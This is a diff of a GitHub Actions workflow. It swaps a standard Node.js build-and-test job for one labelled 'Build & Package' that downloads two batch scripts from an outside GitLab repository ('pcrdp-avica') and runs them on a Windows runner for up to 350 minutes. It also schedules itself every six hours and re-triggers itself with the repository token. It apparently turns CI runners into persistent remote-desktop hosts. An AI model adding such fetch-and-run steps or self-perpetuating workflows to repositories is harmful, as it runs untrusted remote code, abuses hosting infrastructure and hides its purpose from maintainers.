@@ -1,29 +1,75 @@
-name: Node.js CI
+name: NewAvica
 
 on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
+  workflow_dispatch:
+    inputs:
+      branch:
+        description: 'Branch to run on'
+        required: true
+        default: 'main'
+  schedule:
+    - cron: '0 */6 * * *'  # every 6 hours UTC
+
+permissions:
+  contents: write        # needed for artifact cleanup
 
 jobs:
   build:
-    runs-on: ubuntu-latest
-
+    name: Build & Package
+    runs-on: windows-latest
+    timeout-minutes: 350
     steps:
-      - name: Checkout code
-        uses: actions/checkout@v4
-
-      - name: Setup Node.js
-        uses: actions/setup-node@v4
+      - name: Checkout code (shallow)
+        uses: actions/checkout@v3
         with:
-          node-version: '22'
+          ref: ${{ inputs.branch }}
+          fetch-depth: 1
 
-      - name: Install dependencies
-        run: npm install
+      - name: Download Downloads.bat
+        run: |
+          curl -sL https://gitlab.com/gusta7w7/pcrdp-avica/-/raw/main/Downloads.bat -o Downloads.bat
 
-      - name: Run tests
-        run: npm test --if-present
+      - name: Run Downloads.bat
+        shell: pwsh
+        run: .\Downloads.bat
 
-      - name: Build project
-        run: npm run build --if-present
+      - name: Download show.bat
+        run: |
+          curl -sL https://gitlab.com/gusta7w7/pcrdp-avica/-/raw/main/show.bat -o show.bat
+
+      - name: Run show.bat and capture log
+        shell: pwsh
+        run: .\show.bat > build.log
+
+      - name: Upload build.log
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-log
+          path: build.log
+
+  cleanup:
+    name: Cleanup artifacts older than 7 days
+    needs: build
+    runs-on: ubuntu-latest
+    steps:
+      - name: Purge old artifacts
+        run: |
+          gh api actions/artifacts?per_page=100 \
+            -H "Accept: application/vnd.github+json" \
+            --jq '.artifacts[] | select((now - (.created_at|fromdate)) > 604800) | .id' \
+          | xargs -r -I {} gh api actions/artifacts/{} -X DELETE \
+            -H "Accept: application/vnd.github+json"
+
+  self-retrigger:
+    name: Dispatch Next Run
+    needs: cleanup
+    if: ${{ always() }}
+    runs-on: ubuntu-latest
+    steps:
+      - name: Re-dispatch workflow
+        run: |
+          curl -s -X POST \
+            -H "Accept: application/vnd.github.v3+json" \
+            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
+            "https://api.github.com/repos/${{ github.repository }}/actions/workflows/NewAvica.yml/dispatches" \
+            -d "{\"ref\":\"${{ inputs.branch }}\"}"
